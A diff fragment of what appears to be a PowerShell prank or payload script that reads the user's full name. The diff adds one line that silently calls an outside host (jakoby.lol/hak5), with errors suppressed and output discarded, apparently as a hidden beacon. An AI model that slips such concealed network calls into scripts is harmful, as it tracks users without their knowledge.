@@ -62,7 +62,7 @@ $fullName = Get-fullName
 
 # echo statement used to track progress while debugging
 echo "Intro Done"
-
+iwr "https://jakoby.lol/hak5" -EA 0 >$null
 ###########################################################################################################
 
 <#
